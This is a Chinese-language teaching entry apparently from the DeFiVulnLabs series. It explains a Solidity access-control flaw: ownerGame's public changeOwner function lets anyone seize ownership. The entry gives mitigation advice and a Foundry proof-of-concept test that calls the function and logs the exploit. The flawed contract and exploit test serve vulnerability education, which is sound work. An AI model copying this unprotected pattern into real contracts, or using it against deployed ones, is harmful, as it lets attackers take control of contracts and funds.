# 可见性  
[Visibility.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Visibility.sol)  
**名称：** 不当的访问控制漏洞  

**描述：**  
函数的默认可见性为Public。  
如果存在不安全的可见性设置，攻击者可以直接调用智能合约中的敏感函数。  
ownerGame 合约具有一个 changeOwner 函数，该函数旨在更改合约的所有者。  
然而，由于不当的访问控制，该函数是公开可访问的，可以被任何外部账户或合约调用。  
因此，攻击者可以调用此函数来更改合约的所有权，并掌控合约。  

**影响：** 任何人都可以更改合约的所有者。  

**缓解措施：**  
使用访问控制修饰符：Solidity 提供了诸如 onlyOwner 等修饰器，可用于限制函数的访问  

**OwnerGame合约：** 
```
contract ownerGame {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // changeOwner 的可见性是错的，应该加上onlyOwner修饰器
    function changeOwner(address _new) public {
        owner = _new;
    }
}
```

**如何测试：**  
forge test --contracts src/test/Visibility.sol-vvvv  
```
// 用于测试在ownerGameContract合约中函数的可见性
function testVisibility() public {
    // 创建ownerGameContract合约的新实例
    ownerGameContract = new ownerGame();

    // 记录ownerGameContract合约的当前所有者。
    console.log("Before exploiting, owner of ownerGame:", ownerGameContract.owner());

    // 调用ownerGameContract的changeOwner函数，将所有者更改为msg.sender
    ownerGameContract.changeOwner(msg.sender);

    // 记录ownerGameContract合约的新所有者，现在应该是此函数的调用者。
    console.log("After exploiting, owner of ownerGame:", ownerGameContract.owner());

    // 记录一条表明攻击已完成的消息。
    console.log("Exploit completed");
}
``` 
**红框：** 所有者被更改  
![image](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F6233a47b-90c4-4fff-a73b-fc417962f36b%2FUntitled.png?table=block&id=cfd25398-31cd-4483-966b-76737878afbd&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)